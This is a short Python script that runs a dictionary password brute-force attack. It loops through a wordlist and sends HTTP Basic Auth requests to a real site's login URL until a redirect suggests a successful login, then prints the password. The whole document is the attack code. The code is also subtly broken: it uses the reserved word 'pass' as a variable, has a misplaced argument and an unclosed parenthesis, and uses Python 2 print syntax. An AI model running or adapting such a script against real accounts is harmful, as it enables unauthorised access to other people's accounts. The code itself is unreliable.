import requests
from requests.auth import HTTPBasicAuth

with open('passwords.txt') as passwords:
    for pass in passwords.readlines():
        r = requests.get('http://packtpub.com/login', auth=HTTPBasicAuth('user', pass, allow_redirects=False)
        if r.status_code == 301 and 'login' not in r.headers['location']:
            print 'Login successful, password:', pass
            break